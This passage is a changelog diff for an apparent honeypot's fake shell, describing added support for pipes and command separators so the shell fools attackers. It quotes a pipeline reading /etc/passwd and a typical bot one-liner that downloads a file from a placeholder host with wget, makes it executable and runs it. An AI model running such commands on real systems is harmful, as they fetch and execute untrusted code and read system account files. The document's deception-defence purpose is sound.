@@ -8,6 +8,14 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ## [Unreleased]
 
 ### Added
+- Pipes. `cat /etc/passwd | grep root | wc -l` now runs as a pipeline: each
+  stage's output becomes the next stage's stdin and only the last stage's
+  output is shown. `cat`, `grep`, `head`, `tail`, and `wc` read that input when
+  they are given no file operand, exactly as they read real stdin; a stage that
+  ignores stdin (`ls`, `whoami`, …) behaves as it would in a real pipeline. The
+  previous behaviour dumped the first command's full output and then reported
+  `cat: |: No such file or directory` — recognisable at a glance, and it
+  advertised the shell as fake to anyone who piped anything.
 - Command separators: `;`, `&&`, and `||` now split a line into commands that
   run in order, with `&&`/`||` gated on the previous exit status. Bot payloads
   are almost always one-liners (`cd /tmp; wget http://x/a; chmod +x a; ./a`);
